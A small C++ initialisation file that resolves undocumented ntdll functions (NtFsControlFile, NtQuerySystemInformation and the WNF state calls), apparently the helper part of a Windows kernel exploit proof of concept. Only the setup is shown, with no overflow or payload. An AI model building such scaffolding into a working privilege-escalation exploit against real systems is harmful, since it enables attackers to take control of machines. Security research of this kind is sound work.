#include "windows_api.h"

func* _NtFsControlFile = nullptr;
fpNtCreateWnfStateName NtCreateWnfStateName = nullptr;
fpNtUpdateWnfStateData NtUpdateWnfStateData = nullptr;
fpNtQueryWnfStateData NtQueryWnfStateData = nullptr;
fpNtDeleteWnfStateData NtDeleteWnfStateData = nullptr;
fpNtDeleteWnfStateName NtDeleteWnfStateName = nullptr;
_NtQuerySystemInformation fnNtQuerySystemInformation = nullptr;
VOID InitEnvironment() {
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (!hNtdll) {
		printf("[-] Failed to load ntdll.dll.\n");
		exit(EXIT_FAILURE);
	}

	fnNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	if (!fnNtQuerySystemInformation) {
		printf("[-] Failed to get NtQuerySystemInformation function address.\n");
		exit(EXIT_FAILURE);
	}
	_NtFsControlFile = (func*)GetProcAddress(hNtdll, "NtFsControlFile");
	if (!_NtFsControlFile) {
		printf("[-] Failed to get NtFsControlFile function address.\n");
		exit(EXIT_FAILURE);
	}
	NtCreateWnfStateName = (fpNtCreateWnfStateName)GetProcAddress(hNtdll, "NtCreateWnfStateName");
	NtUpdateWnfStateData = (fpNtUpdateWnfStateData)GetProcAddress(hNtdll, "NtUpdateWnfStateData");
	NtQueryWnfStateData = (fpNtQueryWnfStateData)GetProcAddress(hNtdll, "NtQueryWnfStateData");
	NtDeleteWnfStateData = (fpNtDeleteWnfStateData)GetProcAddress(hNtdll, "NtDeleteWnfStateData");
	NtDeleteWnfStateName = (fpNtDeleteWnfStateName)GetProcAddress(hNtdll, "NtDeleteWnfStateName");
}